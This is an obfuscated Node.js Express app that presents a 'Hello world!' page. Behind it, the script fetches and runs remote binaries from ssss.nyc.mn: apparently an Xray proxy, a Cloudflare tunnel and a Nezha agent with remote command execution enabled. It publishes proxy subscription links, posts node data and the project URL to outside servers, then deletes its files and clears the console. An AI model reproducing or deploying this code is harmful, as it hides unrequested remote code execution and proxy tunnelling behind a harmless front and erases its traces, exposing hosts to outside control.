const _0x50f1e0=_0x2336;(function(_0x197427,_0x4e1422){const _0x475bfa=_0x2336,_0x5d0d84=_0x197427();while(!![]){try{const _0x33c438=-parseInt(_0x475bfa(0x1ee))/0x1*(parseInt(_0x475bfa(0x1ed))/0x2)+-parseInt(_0x475bfa(0x1fd))/0x3*(-parseInt(_0x475bfa(0x205))/0x4)+-parseInt(_0x475bfa(0x1e9))/0x5*(-parseInt(_0x475bfa(0x204))/0x6)+parseInt(_0x475bfa(0x1b1))/0x7*(-parseInt(_0x475bfa(0x255))/0x8)+-parseInt(_0x475bfa(0x1f7))/0x9+-parseInt(_0x475bfa(0x1ba))/0xa+parseInt(_0x475bfa(0x248))/0xb*(parseInt(_0x475bfa(0x233))/0xc);if(_0x33c438===_0x4e1422)break;else _0x5d0d84['push'](_0x5d0d84['shift']());}catch(_0x167355){_0x5d0d84['push'](_0x5d0d84['shift']());}}}(_0x2367,0xc38d1));const express=require(_0x50f1e0(0x1c0)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x50f1e0(0x22c)),{promisify}=require(_0x50f1e0(0x1bc)),exec=promisify(require(_0x50f1e0(0x1f2))['exec']),{execSync}=require(_0x50f1e0(0x1f2)),UPLOAD_URL=process[_0x50f1e0(0x238)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x50f1e0(0x238)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x50f1e0(0x238)][_0x50f1e0(0x23f)]||![],FILE_PATH=process[_0x50f1e0(0x238)]['FILE_PATH']||'./tmp',SUB_PATH=process[_0x50f1e0(0x238)][_0x50f1e0(0x23d)]||'sub',PORT=process['env'][_0x50f1e0(0x1e8)]||process[_0x50f1e0(0x238)][_0x50f1e0(0x1d6)]||0xbb8,UUID=process[_0x50f1e0(0x238)]['UUID']||'9afd1229-b893-40c1-84dd-51e7ce204913',NEZHA_SERVER=process[_0x50f1e0(0x238)][_0x50f1e0(0x1f0)]||'',NEZHA_PORT=process['env'][_0x50f1e0(0x1ab)]||'',NEZHA_KEY=process['env'][_0x50f1e0(0x1f3)]||'',ARGO_DOMAIN=process[_0x50f1e0(0x238)][_0x50f1e0(0x226)]||'',ARGO_AUTH=process[_0x50f1e0(0x238)]['ARGO_AUTH']||'',ARGO_PORT=process[_0x50f1e0(0x238)][_0x50f1e0(0x1c5)]||0x1f41,CFIP=process['env'][_0x50f1e0(0x1b0)]||_0x50f1e0(0x207),CFPORT=process[_0x50f1e0(0x238)][_0x50f1e0(0x243)]||0x1bb,NAME=process[_0x50f1e0(0x238)]['NAME']||_0x50f1e0(0x247);!fs[_0x50f1e0(0x1ea)](FILE_PATH)?(fs[_0x50f1e0(0x22b)](FILE_PATH),console['log'](FILE_PATH+_0x50f1e0(0x1e2))):console[_0x50f1e0(0x1e1)](FILE_PATH+_0x50f1e0(0x1c3));let npmPath=path[_0x50f1e0(0x1c4)](FILE_PATH,'npm'),phpPath=path[_0x50f1e0(0x1c4)](FILE_PATH,_0x50f1e0(0x22e)),webPath=path[_0x50f1e0(0x1c4)](FILE_PATH,_0x50f1e0(0x21a)),botPath=path[_0x50f1e0(0x1c4)](FILE_PATH,_0x50f1e0(0x250)),subPath=path[_0x50f1e0(0x1c4)](FILE_PATH,_0x50f1e0(0x1e3)),listPath=path[_0x50f1e0(0x1c4)](FILE_PATH,_0x50f1e0(0x25d)),bootLogPath=path[_0x50f1e0(0x1c4)](FILE_PATH,_0x50f1e0(0x20e)),configPath=path[_0x50f1e0(0x1c4)](FILE_PATH,_0x50f1e0(0x1c7));function deleteNodes(){const _0x2ff2ca=_0x50f1e0;try{if(!UPLOAD_URL)return;if(!fs[_0x2ff2ca(0x1ea)](subPath))return;let _0x385369;try{_0x385369=fs[_0x2ff2ca(0x245)](subPath,_0x2ff2ca(0x1d3));}catch{return null;}const _0x25d258=Buffer[_0x2ff2ca(0x1a7)](_0x385369,_0x2ff2ca(0x1da))[_0x2ff2ca(0x23a)]('utf-8'),_0x105a2a=_0x25d258[_0x2ff2ca(0x237)]('\x0a')[_0x2ff2ca(0x1aa)](_0x2bf6e3=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2ff2ca(0x215)](_0x2bf6e3));if(_0x105a2a[_0x2ff2ca(0x1c1)]===0x0)return;return axios[_0x2ff2ca(0x1d4)](UPLOAD_URL+_0x2ff2ca(0x20f),JSON[_0x2ff2ca(0x1fe)]({'nodes':_0x105a2a}),{'headers':{'Content-Type':_0x2ff2ca(0x222)}})[_0x2ff2ca(0x212)](_0x27a715=>{return null;});}catch(_0x1d96c4){return null;}}function cleanupOldFiles(){const _0x95887f=_0x50f1e0,_0x3e5bbc=['web','bot',_0x95887f(0x1a6),_0x95887f(0x22e),_0x95887f(0x1e3),_0x95887f(0x20e)];_0x3e5bbc[_0x95887f(0x1dc)](_0x3f73da=>{const _0x217a5a=_0x95887f,_0x194d09=path[_0x217a5a(0x1c4)](FILE_PATH,_0x3f73da);fs[_0x217a5a(0x1c6)](_0x194d09,()=>{});});}app[_0x50f1e0(0x21c)]('/',function(_0x5a8182,_0x56eb64){const _0x51e4fa=_0x50f1e0;_0x56eb64[_0x51e4fa(0x228)]('Hello\x20world!');});const config={'log':{'access':_0x50f1e0(0x225),'error':_0x50f1e0(0x225),'loglevel':_0x50f1e0(0x25a)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x50f1e0(0x1b5),'settings':{'clients':[{'id':UUID,'flow':_0x50f1e0(0x1bb)}],'decryption':_0x50f1e0(0x25a),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x50f1e0(0x1ca),'dest':0xbbb},{'path':_0x50f1e0(0x1b9),'dest':0xbbc}]},'streamSettings':{'network':_0x50f1e0(0x1b4)}},{'port':0xbb9,'listen':_0x50f1e0(0x206),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x50f1e0(0x25a)},'streamSettings':{'network':_0x50f1e0(0x1b4),'security':'none'}},{'port':0xbba,'listen':_0x50f1e0(0x206),'protocol':_0x50f1e0(0x1b5),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x50f1e0(0x25a)},'streamSettings':{'network':'ws','security':_0x50f1e0(0x25a),'wsSettings':{'path':_0x50f1e0(0x223)}},'sniffing':{'enabled':!![],'destOverride':[_0x50f1e0(0x21b),_0x50f1e0(0x251),_0x50f1e0(0x25b)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x50f1e0(0x206),'protocol':_0x50f1e0(0x21d),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x50f1e0(0x1ca)}},'sniffing':{'enabled':!![],'destOverride':[_0x50f1e0(0x21b),'tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x50f1e0(0x206),'protocol':_0x50f1e0(0x1eb),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x50f1e0(0x25a),'wsSettings':{'path':_0x50f1e0(0x1b9)}},'sniffing':{'enabled':!![],'destOverride':[_0x50f1e0(0x21b),_0x50f1e0(0x251),_0x50f1e0(0x25b)],'metadataOnly':![]}}],'dns':{'servers':[_0x50f1e0(0x20b)]},'outbounds':[{'protocol':_0x50f1e0(0x1c9),'tag':'direct'},{'protocol':_0x50f1e0(0x256),'tag':'block'}]};function _0x2336(_0x3034bc,_0x11ccb1){const _0x2367ba=_0x2367();return _0x2336=function(_0x2336fe,_0x366e31){_0x2336fe=_0x2336fe-0x1a6;let _0x2aac7d=_0x2367ba[_0x2336fe];return _0x2aac7d;},_0x2336(_0x3034bc,_0x11ccb1);}fs[_0x50f1e0(0x1a8)](path[_0x50f1e0(0x1c4)](FILE_PATH,'config.json'),JSON[_0x50f1e0(0x1fe)](config,null,0x2));function _0x2367(){const _0x13dd10=['bot','tls','&type=ws&host=','2053','fileName','23176kReZlf','blackhole','close','/tunnel.yml\x20run','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','none','quic','./npm','list.txt','npm','from','writeFileSync','./php','filter','NEZHA_PORT','/sub.txt\x20saved\x20successfully','push','?security=tls&sni=','\x0aclient_secret:\x20','CFIP','3052JkATcH','\x20>/dev/null\x202>&1','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','tcp','vless','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','then','pop','/trojan-argo','9666570kVWalg','xtls-rprx-vision','util','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','automatic\x20access\x20task\x20added\x20successfully','pipe','express','length','\x0a\x20\x20credentials-file:\x20','\x20already\x20exists','join','ARGO_PORT','unlink','config.json','https://arm64.ssss.nyc.mn/agent','freedom','/vmess-argo','\x0a\x20\x20tunnel:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','\x0a\x20\x20\x0avmess://','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','./web','https://amd64.ssss.nyc.mn/agent','php\x20is\x20running','utf-8','post','rm\x20-rf\x20','PORT','trim','npm\x20is\x20running','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','base64','https://amd64.ssss.nyc.mn/2go','forEach','php\x20running\x20error:\x20','clear','amd','chmod','log','\x20is\x20created','sub.txt','match','nohup\x20','Error\x20executing\x20command:\x20','finish','SERVER_PORT','5SLfjrR','existsSync','trojan','https://arm64.ssss.nyc.mn/v1','15134ERniiH','146XCiIAW','has','NEZHA_SERVER','Error\x20reading\x20boot.log:','child_process','NEZHA_KEY','8443','\x20>/dev/null\x202>&1\x20&','includes','13851387qBGjNY','ArgoDomain:','https://amd64.ssss.nyc.mn/v1','web\x20running\x20error:\x20','Subscription\x20uploaded\x20successfully','bot\x20is\x20running','165eihUWj','stringify','\x20successfully','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','message','Content-Type','6248922WCumsA','67996aUZzML','127.0.0.1','time.is','Empowerment\x20failed\x20for\x20','Download\x20','fileUrl','https+local://8.8.8.8/dns-query','web\x20is\x20running','tunnel.json','boot.log','/api/delete-nodes','2087','Skipping\x20adding\x20automatic\x20access\x20task','catch','./bot','\x20failed:\x20','test','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','&path=%2Ftrojan-argo%3Fed%3D2560#','/npm\x20-s\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','web','http','get','vmess','443','stream','?encryption=none&security=tls&sni=','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','application/json','/vless-argo','bot\x20is\x20running.','/dev/null','ARGO_DOMAIN','/api/add-subscriptions','send','arch','TunnelSecret','mkdirSync','path','/bot\x20','php','listen','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','status','\x0a\x20\x20\x0atrojan://','12DDgcJz','/php\x20-c\x20\x22','ARGO_DOMAIN:','https://arm64.ssss.nyc.mn/web','split','env','config.yaml','toString','Error\x20downloading\x20files:','false','SUB_PATH','/vmess-argo?ed=2560','AUTO_ACCESS','https://arm64.ssss.nyc.mn/2go','Empowerment\x20success\x20for\x20','aarch64','CFPORT','&path=%2Fvless-argo%3Fed%3D2560#','readFileSync','error','Vls','40679309klgvER','2083','arm','true','NEZHA\x20variable\x20is\x20empty,skip\x20running','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','http\x20server\x20is\x20running\x20on\x20port:','App\x20is\x20running'];_0x2367=function(){return _0x13dd10;};return _0x2367();}function getSystemArchitecture(){const _0xcc3eaf=_0x50f1e0,_0x42feeb=os[_0xcc3eaf(0x229)]();return _0x42feeb===_0xcc3eaf(0x24a)||_0x42feeb==='arm64'||_0x42feeb===_0xcc3eaf(0x242)?_0xcc3eaf(0x24a):_0xcc3eaf(0x1df);}function downloadFile(_0x9db50a,_0x3c3797,_0x54b6c7){const _0x599d95=_0x50f1e0,_0x12685b=path[_0x599d95(0x1c4)](FILE_PATH,_0x9db50a),_0x331bef=fs['createWriteStream'](_0x12685b);axios({'method':'get','url':_0x3c3797,'responseType':_0x599d95(0x21f)})[_0x599d95(0x1b7)](_0x219c4f=>{const _0x21bcd3=_0x599d95;_0x219c4f['data'][_0x21bcd3(0x1bf)](_0x331bef),_0x331bef['on'](_0x21bcd3(0x1e7),()=>{const _0x573423=_0x21bcd3;_0x331bef[_0x573423(0x257)](),console[_0x573423(0x1e1)](_0x573423(0x209)+_0x9db50a+_0x573423(0x1ff)),_0x54b6c7(null,_0x9db50a);}),_0x331bef['on'](_0x21bcd3(0x246),_0x37626c=>{const _0x1b25ee=_0x21bcd3;fs[_0x1b25ee(0x1c6)](_0x12685b,()=>{});const _0x4b0832='Download\x20'+_0x9db50a+_0x1b25ee(0x214)+_0x37626c['message'];console[_0x1b25ee(0x246)](_0x4b0832),_0x54b6c7(_0x4b0832);});})[_0x599d95(0x212)](_0x51d71b=>{const _0x1dc997=_0x599d95,_0x26f2a3=_0x1dc997(0x209)+_0x9db50a+_0x1dc997(0x214)+_0x51d71b[_0x1dc997(0x202)];console[_0x1dc997(0x246)](_0x26f2a3),_0x54b6c7(_0x26f2a3);});}async function downloadFilesAndRun(){const _0x1b97bf=_0x50f1e0,_0x417bdb=getSystemArchitecture(),_0x555208=getFilesForArchitecture(_0x417bdb);if(_0x555208[_0x1b97bf(0x1c1)]===0x0){console[_0x1b97bf(0x1e1)](_0x1b97bf(0x1ce));return;}const _0x2382ee=_0x555208['map'](_0x2eb826=>{return new Promise((_0x30f5d4,_0x55073f)=>{const _0x5d6fb4=_0x2336;downloadFile(_0x2eb826[_0x5d6fb4(0x254)],_0x2eb826[_0x5d6fb4(0x20a)],(_0x51faf3,_0x8405c8)=>{_0x51faf3?_0x55073f(_0x51faf3):_0x30f5d4(_0x8405c8);});});});try{await Promise['all'](_0x2382ee);}catch(_0x340c7c){console[_0x1b97bf(0x246)](_0x1b97bf(0x23b),_0x340c7c);return;}function _0x3e2aed(_0x5be022){const _0x403fd=_0x1b97bf,_0x2124ec=0x1fd;_0x5be022[_0x403fd(0x1dc)](_0x3d09b5=>{const _0x75fec8=_0x403fd,_0xadfbae=path['join'](FILE_PATH,_0x3d09b5);fs[_0x75fec8(0x1ea)](_0xadfbae)&&fs[_0x75fec8(0x1e0)](_0xadfbae,_0x2124ec,_0x177b2d=>{const _0x357f84=_0x75fec8;_0x177b2d?console[_0x357f84(0x246)](_0x357f84(0x208)+_0xadfbae+':\x20'+_0x177b2d):console[_0x357f84(0x1e1)](_0x357f84(0x241)+_0xadfbae+':\x20'+_0x2124ec[_0x357f84(0x23a)](0x8));});});}const _0x14db96=NEZHA_PORT?[_0x1b97bf(0x25c),_0x1b97bf(0x1d0),'./bot']:[_0x1b97bf(0x1a9),_0x1b97bf(0x1d0),_0x1b97bf(0x213)];_0x3e2aed(_0x14db96);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1cd574=NEZHA_SERVER[_0x1b97bf(0x1f6)](':')?NEZHA_SERVER['split'](':')[_0x1b97bf(0x1b8)]():'',_0xd5c236=new Set([_0x1b97bf(0x21e),_0x1b97bf(0x1f4),'2096',_0x1b97bf(0x210),_0x1b97bf(0x249),'2053']),_0x204ba9=_0xd5c236[_0x1b97bf(0x1ef)](_0x1cd574)?_0x1b97bf(0x24b):_0x1b97bf(0x23c),_0x1cad2a=_0x1b97bf(0x1af)+NEZHA_KEY+_0x1b97bf(0x1cf)+NEZHA_SERVER+_0x1b97bf(0x1d9)+_0x204ba9+_0x1b97bf(0x259)+UUID;fs[_0x1b97bf(0x1a8)](path[_0x1b97bf(0x1c4)](FILE_PATH,_0x1b97bf(0x239)),_0x1cad2a);const _0x46d724=_0x1b97bf(0x1e5)+FILE_PATH+_0x1b97bf(0x234)+FILE_PATH+_0x1b97bf(0x230);try{await exec(_0x46d724),console[_0x1b97bf(0x1e1)](_0x1b97bf(0x1d2)),await new Promise(_0x161c42=>setTimeout(_0x161c42,0x3e8));}catch(_0x489aa6){console['error'](_0x1b97bf(0x1dd)+_0x489aa6);}}else{let _0x5ec765='';const _0x322468=[_0x1b97bf(0x21e),_0x1b97bf(0x1f4),'2096',_0x1b97bf(0x210),_0x1b97bf(0x249),_0x1b97bf(0x253)];_0x322468['includes'](NEZHA_PORT)&&(_0x5ec765='--tls');const _0x32325f='nohup\x20'+FILE_PATH+_0x1b97bf(0x218)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x5ec765+'\x20>/dev/null\x202>&1\x20&';try{await exec(_0x32325f),console[_0x1b97bf(0x1e1)](_0x1b97bf(0x1d8)),await new Promise(_0xc060d8=>setTimeout(_0xc060d8,0x3e8));}catch(_0x23f780){console[_0x1b97bf(0x246)]('npm\x20running\x20error:\x20'+_0x23f780);}}}else console[_0x1b97bf(0x1e1)](_0x1b97bf(0x24c));const _0x3768a3=_0x1b97bf(0x1e5)+FILE_PATH+'/web\x20-c\x20'+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3768a3),console[_0x1b97bf(0x1e1)](_0x1b97bf(0x20c)),await new Promise(_0x3c2173=>setTimeout(_0x3c2173,0x3e8));}catch(_0x318256){console[_0x1b97bf(0x246)](_0x1b97bf(0x1fa)+_0x318256);}if(fs[_0x1b97bf(0x1ea)](path['join'](FILE_PATH,'bot'))){let _0x49ca4c;if(ARGO_AUTH[_0x1b97bf(0x1e4)](/^[A-Z0-9a-z=]{120,250}$/))_0x49ca4c=_0x1b97bf(0x1cc)+ARGO_AUTH;else ARGO_AUTH[_0x1b97bf(0x1e4)](/TunnelSecret/)?_0x49ca4c='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x1b97bf(0x258):_0x49ca4c='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x1b97bf(0x1b6)+ARGO_PORT;try{await exec(_0x1b97bf(0x1e5)+FILE_PATH+_0x1b97bf(0x22d)+_0x49ca4c+_0x1b97bf(0x1f5)),console['log'](_0x1b97bf(0x1fc)),await new Promise(_0x53347b=>setTimeout(_0x53347b,0x7d0));}catch(_0x37d253){console['error'](_0x1b97bf(0x1e6)+_0x37d253);}}await new Promise(_0x1f2ba3=>setTimeout(_0x1f2ba3,0x1388));}function getFilesForArchitecture(_0x57cb71){const _0x40c200=_0x50f1e0;let _0x4e8b76;_0x57cb71===_0x40c200(0x24a)?_0x4e8b76=[{'fileName':_0x40c200(0x21a),'fileUrl':_0x40c200(0x236)},{'fileName':_0x40c200(0x250),'fileUrl':_0x40c200(0x240)}]:_0x4e8b76=[{'fileName':'web','fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':_0x40c200(0x250),'fileUrl':_0x40c200(0x1db)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x4f829a=_0x57cb71===_0x40c200(0x24a)?_0x40c200(0x1c8):_0x40c200(0x1d1);_0x4e8b76['unshift']({'fileName':_0x40c200(0x1a6),'fileUrl':_0x4f829a});}else{const _0x5309b1=_0x57cb71===_0x40c200(0x24a)?_0x40c200(0x1ec):_0x40c200(0x1f9);_0x4e8b76['unshift']({'fileName':_0x40c200(0x22e),'fileUrl':_0x5309b1});}}return _0x4e8b76;}function argoType(){const _0x10dcd2=_0x50f1e0;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x10dcd2(0x1e1)](_0x10dcd2(0x200));return;}if(ARGO_AUTH['includes'](_0x10dcd2(0x22a))){fs['writeFileSync'](path[_0x10dcd2(0x1c4)](FILE_PATH,_0x10dcd2(0x20d)),ARGO_AUTH);const _0x4110be=_0x10dcd2(0x1cb)+ARGO_AUTH[_0x10dcd2(0x237)]('\x22')[0xb]+_0x10dcd2(0x1c2)+path['join'](FILE_PATH,_0x10dcd2(0x20d))+_0x10dcd2(0x221)+ARGO_DOMAIN+_0x10dcd2(0x201)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path[_0x10dcd2(0x1c4)](FILE_PATH,'tunnel.yml'),_0x4110be);}else console[_0x10dcd2(0x1e1)](_0x10dcd2(0x1b3));}argoType();async function extractDomains(){const _0x383540=_0x50f1e0;let _0x18f687;if(ARGO_AUTH&&ARGO_DOMAIN)_0x18f687=ARGO_DOMAIN,console[_0x383540(0x1e1)](_0x383540(0x235),_0x18f687),await _0x2feab6(_0x18f687);else try{const _0x33507f=fs['readFileSync'](path[_0x383540(0x1c4)](FILE_PATH,_0x383540(0x20e)),_0x383540(0x1d3)),_0x559843=_0x33507f[_0x383540(0x237)]('\x0a'),_0x44cf58=[];_0x559843[_0x383540(0x1dc)](_0x48efe9=>{const _0x192c01=_0x48efe9['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x192c01){const _0x4d24b9=_0x192c01[0x1];_0x44cf58['push'](_0x4d24b9);}});if(_0x44cf58[_0x383540(0x1c1)]>0x0)_0x18f687=_0x44cf58[0x0],console[_0x383540(0x1e1)](_0x383540(0x1f8),_0x18f687),await _0x2feab6(_0x18f687);else{console[_0x383540(0x1e1)](_0x383540(0x219)),fs['unlinkSync'](path[_0x383540(0x1c4)](FILE_PATH,_0x383540(0x20e)));async function _0x3821e2(){try{await exec('pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1');}catch(_0x1101db){}}_0x3821e2(),await new Promise(_0xd4bcee=>setTimeout(_0xd4bcee,0xbb8));const _0x18dcf1=_0x383540(0x1bd)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x383540(0x1e5)+path[_0x383540(0x1c4)](FILE_PATH,_0x383540(0x250))+'\x20'+_0x18dcf1+_0x383540(0x1f5)),console[_0x383540(0x1e1)](_0x383540(0x224)),await new Promise(_0x34c9fe=>setTimeout(_0x34c9fe,0xbb8)),await extractDomains();}catch(_0x4ba40e){console[_0x383540(0x246)](_0x383540(0x1e6)+_0x4ba40e);}}}catch(_0x33a3a6){console['error'](_0x383540(0x1f1),_0x33a3a6);}async function _0x2feab6(_0x547b6a){const _0x59b349=_0x383540,_0x4f7fb5=execSync(_0x59b349(0x24d),{'encoding':_0x59b349(0x1d3)}),_0x29e9c4=_0x4f7fb5[_0x59b349(0x1d7)]();return new Promise(_0x8fa2ea=>{setTimeout(()=>{const _0x44367f=_0x2336,_0xf986f5={'v':'2','ps':NAME+'-'+_0x29e9c4,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x44367f(0x25a),'net':'ws','type':_0x44367f(0x25a),'host':_0x547b6a,'path':_0x44367f(0x23e),'tls':_0x44367f(0x251),'sni':_0x547b6a,'alpn':''},_0x5c5744='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x44367f(0x220)+_0x547b6a+_0x44367f(0x252)+_0x547b6a+_0x44367f(0x244)+NAME+'-'+_0x29e9c4+_0x44367f(0x1cd)+Buffer[_0x44367f(0x1a7)](JSON[_0x44367f(0x1fe)](_0xf986f5))[_0x44367f(0x23a)](_0x44367f(0x1da))+_0x44367f(0x232)+UUID+'@'+CFIP+':'+CFPORT+_0x44367f(0x1ae)+_0x547b6a+'&type=ws&host='+_0x547b6a+_0x44367f(0x217)+NAME+'-'+_0x29e9c4+'\x0a\x20\x20\x20\x20';console[_0x44367f(0x1e1)](Buffer[_0x44367f(0x1a7)](_0x5c5744)[_0x44367f(0x23a)](_0x44367f(0x1da))),fs[_0x44367f(0x1a8)](subPath,Buffer[_0x44367f(0x1a7)](_0x5c5744)[_0x44367f(0x23a)]('base64')),console[_0x44367f(0x1e1)](FILE_PATH+_0x44367f(0x1ac)),uplodNodes(),app[_0x44367f(0x21c)]('/'+SUB_PATH,(_0x574ce1,_0x51597a)=>{const _0x718af1=_0x44367f,_0x21ca56=Buffer['from'](_0x5c5744)[_0x718af1(0x23a)](_0x718af1(0x1da));_0x51597a['set'](_0x718af1(0x203),'text/plain;\x20charset=utf-8'),_0x51597a['send'](_0x21ca56);}),_0x8fa2ea(_0x5c5744);},0x7d0);});}}async function uplodNodes(){const _0x5deb5e=_0x50f1e0;if(UPLOAD_URL&&PROJECT_URL){const _0x32f897=PROJECT_URL+'/'+SUB_PATH,_0x173346={'subscription':[_0x32f897]};try{const _0x364bbe=await axios[_0x5deb5e(0x1d4)](UPLOAD_URL+_0x5deb5e(0x227),_0x173346,{'headers':{'Content-Type':_0x5deb5e(0x222)}});if(_0x364bbe[_0x5deb5e(0x231)]===0xc8)console['log']('Subscription\x20uploaded\x20successfully');else return null;}catch(_0x50e870){if(_0x50e870['response']){if(_0x50e870['response'][_0x5deb5e(0x231)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x5deb5e(0x1ea)](listPath))return;const _0x1b5acd=fs['readFileSync'](listPath,_0x5deb5e(0x1d3)),_0x45c0b5=_0x1b5acd['split']('\x0a')['filter'](_0x4e3a9b=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x4e3a9b));if(_0x45c0b5['length']===0x0)return;const _0x1c81f9=JSON[_0x5deb5e(0x1fe)]({'nodes':_0x45c0b5});try{await axios[_0x5deb5e(0x1d4)](UPLOAD_URL+'/api/add-nodes',_0x1c81f9,{'headers':{'Content-Type':_0x5deb5e(0x222)}});if(response[_0x5deb5e(0x231)]===0xc8)console[_0x5deb5e(0x1e1)](_0x5deb5e(0x1fb));else return null;}catch(_0x1b931d){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x3d04c1=_0x2336,_0x505c3b=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0x505c3b[_0x3d04c1(0x1ad)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x505c3b[_0x3d04c1(0x1ad)](phpPath);exec(_0x3d04c1(0x1d5)+_0x505c3b['join']('\x20')+_0x3d04c1(0x1b2),_0xaed212=>{const _0x36eb4b=_0x3d04c1;console[_0x36eb4b(0x1de)](),console['log'](_0x36eb4b(0x24f)),console[_0x36eb4b(0x1e1)](_0x36eb4b(0x216));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x431517=_0x50f1e0;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x431517(0x1e1)](_0x431517(0x211));return;}try{const _0x2431aa=await axios[_0x431517(0x1d4)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x431517(0x222)}});console[_0x431517(0x1e1)](_0x431517(0x1be));}catch(_0xaa7ea){console['error']('添加URL失败:\x20'+_0xaa7ea['message']);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app[_0x50f1e0(0x22f)](PORT,()=>console['log'](_0x50f1e0(0x24e)+PORT+'!'));
